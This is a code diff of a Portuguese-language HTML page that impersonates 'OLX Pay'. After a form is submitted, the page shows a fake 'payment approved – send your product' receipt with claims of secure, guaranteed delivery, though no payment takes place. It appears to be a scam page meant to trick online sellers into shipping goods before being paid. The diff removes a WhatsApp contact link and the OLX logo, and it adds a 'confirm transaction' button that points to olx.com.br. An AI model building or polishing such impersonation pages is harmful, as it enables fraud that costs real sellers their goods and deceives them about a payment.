@@ -14,25 +14,20 @@
       border: 1px solid #ddd;
       border-radius: 10px;
       background-color: #fff;
-      position: relative;
     }
-    .logo {
-      text-align: center;
-      margin-bottom: 20px;
-    }
-    .logo img {
-      width: 100px;
-    }
+
     h2 {
       color: #ff6600;
       text-align: center;
       margin-bottom: 10px;
     }
+
     label {
       display: block;
       margin-top: 15px;
       font-weight: bold;
     }
+
     input {
       width: 100%;
       padding: 10px;
@@ -40,6 +35,7 @@
       border: 1px solid #ccc;
       border-radius: 5px;
     }
+
     .btn {
       margin-top: 20px;
       width: 100%;
@@ -51,9 +47,11 @@
       font-size: 16px;
       cursor: pointer;
     }
+
     .hidden {
       display: none;
     }
+
     .confirmacao {
       background: #f9f9f9;
       border: 1px solid #ddd;
@@ -61,9 +59,11 @@
       padding: 20px;
       margin-top: 30px;
     }
+
     .confirmacao h3 {
       color: #ff6600;
     }
+
     .status {
       background-color: #ffebcc;
       padding: 15px;
@@ -73,40 +73,32 @@
       color: #995700;
       border: 1px solid #ffcc80;
     }
+
     .footer {
       margin-top: 30px;
       font-size: 13px;
       color: #777;
       text-align: center;
     }
-    .whatsapp-float {
-      position: fixed;
-      bottom: 20px;
-      right: 20px;
-      background-color: #25D366;
-      width: 50px;
-      height: 50px;
-      border-radius: 10px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      z-index: 999;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
-    }
-    .whatsapp-float img {
-      width: 30px;
-      height: 30px;
+
+    .link-confirmar {
+      display: inline-block;
+      background-color: #ff6600;
+      color: white;
+      padding: 12px 20px;
+      border-radius: 5px;
+      text-decoration: none;
+      font-weight: bold;
+      font-size: 15px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+      margin-top: 20px;
     }
   </style>
 </head>
 <body>
 
-  <!-- Formulário -->
+  <!-- Tela de Formulário -->
   <div id="formulario">
-    <div class="logo">
-      <img src="https://www.olx.com.br/_next/static/media/logo-olx.5dbf0dbf.svg" alt="OLX Logo">
-    </div>
-
     <h2>Confirmação de Venda - OLX Pay</h2>
 
     <form id="vendaForm">
@@ -123,7 +115,7 @@
     </form>
   </div>
 
-  <!-- Confirmação -->
+  <!-- Tela de Comprovante -->
   <div id="comprovante" class="confirmacao hidden">
     <h3>Pagamento aprovado – envie seu produto</h3>
     <p><strong>Produto vendido:</strong> <span id="produtoInfo"></span></p>
@@ -135,23 +127,27 @@
       Pagamento aprovado e aguardando confirmação do vendedor.
     </div>
 
+    <div style="text-align: center;">
+      <a href="https://www.olx.com.br" target="_blank" class="link-confirmar">
+        Clique aqui para confirmar a transação
+      </a>
+    </div>
+
     <div class="footer">
       Você receberá um e-mail de confirmação com os detalhes da transação.<br>
-      OLX Pay é um serviço de pagamento seguro com garantia de entrega.  
+      OLX Pay é um serviço de pagamento seguro com garantia de entrega.
     </div>
   </div>
-
-  <!-- Botão flutuante do WhatsApp -->
-  <a href="https://wa.me/5516991270147" class="whatsapp-float" target="_blank" title="Falar no WhatsApp">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
-  </a>
 
   <script>
     document.getElementById("vendaForm").addEventListener("submit", function (e) {
       e.preventDefault();
       const form = e.target;
 
+      // Preenche produto na confirmação
       document.getElementById("produtoInfo").innerText = form.produto.value;
+
+      // Mostra a tela de confirmação e oculta o formulário
       document.getElementById("formulario").classList.add("hidden");
       document.getElementById("comprovante").classList.remove("hidden");
     });
